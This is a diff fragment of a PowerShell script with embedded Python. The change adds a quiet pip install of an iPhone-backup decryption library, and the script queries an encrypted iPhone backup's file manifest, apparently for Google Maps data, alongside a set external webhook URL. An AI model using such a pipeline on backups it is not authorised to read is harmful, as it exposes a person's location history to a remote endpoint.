@@ -2,6 +2,10 @@ $webhookUrl = "https://webhooks.tasklet.ai/v1/public/webhook/a_1gkkvt5afqwmjxbqm
 $computer = $env:COMPUTERNAME
 $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
 
+# Ensure required packages are installed
+Write-Host "Installing required packages..."
+& python -m pip install requests iphone-backup-decrypt --quiet 2>&1 | Out-Null
+
 $script = @'
 import sys, os, sqlite3, tempfile, shutil, json, requests
 from iphone_backup_decrypt import EncryptedBackup, RelativePath, DomainLike
@@ -62,7 +66,6 @@ try:
     log(f"Manifest path: {manifest_path}")
     if manifest_path and os.path.exists(manifest_path):
         conn = sqlite3.connect(manifest_path)
-        # All files in any google/maps domain
         rows = conn.execute("""
             SELECT domain, relativePath, flags, file
             FROM Files
